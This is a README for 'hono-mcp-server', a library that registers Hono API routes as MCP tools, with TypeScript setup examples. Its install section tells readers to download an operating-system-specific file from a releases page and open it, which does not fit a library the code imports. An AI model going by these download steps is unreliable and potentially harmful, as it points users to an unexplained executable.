# 🎉 hono-mcp-server - Easily Expose Your Hono API

## 🚀 Getting Started

Welcome to the hono-mcp-server repository! This software allows you to easily expose your Hono API endpoints as MCP tools. Follow these simple steps to download and run the application.

[![Download hono-mcp-server](https://img.shields.io/badge/Download-hono--mcp--server-blue.svg)](https://github.com/ninjacazul/hono-mcp-server/releases)

## 📥 Download & Install

1. Visit the [Releases page](https://github.com/ninjacazul/hono-mcp-server/releases).
2. Look for the latest release. You will see a list of available files.
3. Download the file suitable for your operating system.
4. Once the file is downloaded, locate it in your downloads folder.
5. Open the file to start the installation.

## 📂 Features

- **Simple API Integration:** Use the software with minimal configuration.
- **MCP Tool Registration:** Easily register tools for your API endpoints.
- **Type-Safe Input Handling:** The application ensures that input data conforms to expected formats.

## ⚙️ System Requirements

To run hono-mcp-server, ensure your system meets the following requirements:

- Operating System: Windows, macOS, or a Linux distribution.
- Node.js: Version 14 or newer.
- Basic knowledge of using command line tools may be helpful, but not essential.

## 🛠️ How to Use

After installing the hono-mcp-server, you can set it up for your project. Here's a simplified way to integrate it into your existing application:

1. **Import the Library:**
   Use the following code snippet to import hono and the hono-mcp-server library.
   ```ts
   import { Hono } from "hono";
   import { z } from "zod";
   import { mcp, registerTool } from "hono-mcp-server";
   ```

2. **Create the API:** 
   Here is a basic example to get you started:
   ```ts
   const app = new Hono()
     .get("/users", registerTool("List all users"), (c) => c.json([{ id: 1, name: "Alice" }]))
     .get("/users/:id", registerTool("Get user by ID"), (c) => c.json({ id: c.req.param("id") }))
     .post(
       "/users",
       registerTool({
         description: "Create a new user",
         inputSchema: {
           name: z.string().describe("User's full name"),
           email: z.string().email().describe("User's email address"),
         },
       }),
       async (c) => {
         const { name } = c.req.valid("json"); // typed!
         return c.json({ id: 1, name });
       },
     );
   ```

3. **Expose Your API:** 
   Finally, expose your API as MCP tools.
   ```ts
   export default mcp(app, {
     name: "Users API",
     version: "1.0.0",
   });
   ```

## 📊 Input & Output Schemas

With the `registerTool()` function, you can define input and output schemas for your API endpoints. This helps maintain consistency and reliability across your API.

### Example Schema

```ts
const inputSchema = {
  name: z.string().describe("User's full name"),
  email: z.string().email().describe("User's email address"),
};
```

## 🔍 Troubleshooting

If you encounter any issues during installation or usage, check the following:

- Ensure you have the correct version of Node.js installed.
- Verify that you are using a supported operating system.
- Double-check the format of your API requests to ensure they match expected schemas.

## 📧 Support

If you still need help, feel free to reach out. You can open an issue on the [GitHub repository](https://github.com/ninjacazul/hono-mcp-server/issues). Our community is here to assist you.

## 📦 Additional Resources

- [Hono Documentation](https://hono.dev)
- [MCP Documentation](https://modelcontextprotocol.io)
- Explore additional examples and use cases in our repository to better understand how to integrate and use this application effectively.

[Download hono-mcp-server](https://github.com/ninjacazul/hono-mcp-server/releases) again to ensure that you have the latest version. Enjoy building your APIs!